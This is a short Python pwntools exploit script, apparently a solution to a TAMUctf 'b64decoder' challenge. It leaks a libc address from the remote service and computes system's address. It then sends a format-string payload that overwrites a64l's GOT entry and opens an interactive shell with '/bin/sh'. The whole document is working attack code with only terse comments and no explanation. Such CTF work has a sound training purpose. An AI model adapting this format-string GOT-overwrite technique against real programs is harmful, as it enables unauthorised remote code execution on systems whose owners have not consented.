#RazviOverflow

from pwn import *

# Position of format string in stack: %71$X
# Address of a64l in the .got: 0x0804b398

libc = ELF("libc.so(1).6")

libc_a64l_offset = libc.symbols['a64l']
libc_system_offset = libc.symbols['system']
offset_to_system = libc_a64l_offset-libc_system_offset

print "Offset is: " + str(offset_to_system)

a64l_got_address = 0x0804b398
a64l_got_address_len = 4 #bytes

#binary = process("b64decoder")
binary = remote("challenges.tamuctf.com", 2783)
binary_a64l_address = binary.recvuntil(")\n").split("\n")[-2].split(" ")[-1].replace("(","").replace(")","")
print "Print a64l address is: " + binary_a64l_address

binary_a64l_address = int(binary_a64l_address, 16)
binary_system_address = binary_a64l_address - offset_to_system

binary_system_address = binary_system_address & 0x0000ffff

format_string_padding = "%0" + str(int(binary_system_address - a64l_got_address_len)) + "X"

payload = p32(a64l_got_address) + format_string_padding + "%71$hn"
print "[+] PAYLOAD SENT: " + payload
binary.sendline(payload)

print binary.recv()

binary.sendline("/bin/sh")
binary.interactive()
